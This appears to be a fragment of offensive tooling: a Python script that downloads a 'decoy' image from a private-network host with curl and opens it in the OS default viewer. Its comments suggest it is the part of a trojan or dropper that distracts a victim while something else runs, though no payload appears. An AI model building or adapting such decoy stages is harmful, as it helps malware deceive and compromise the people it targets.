import subprocess
import platform
import os
import tempfile as tmp

### download and execute decoy file ###

# initialise variables
decoy_source = "http://192.168.1.23/files/aventador.jpg"
decoy_filename = "image.jpg"
open_cmd = ""


# discover os of device 
if platform.system() == "Windows":
    open_cmd = "start"
elif platform.system() == "Linux":
    open_cmd = "xdg-open"
else:
    open_cmd = "open"


# download decoy file into temp dir
tempdir = str(tmp.gettempdir())
os.chdir(tempdir)
subprocess.run(["curl", "-o", decoy_filename, decoy_source])
subprocess.run([open_cmd, decoy_filename])
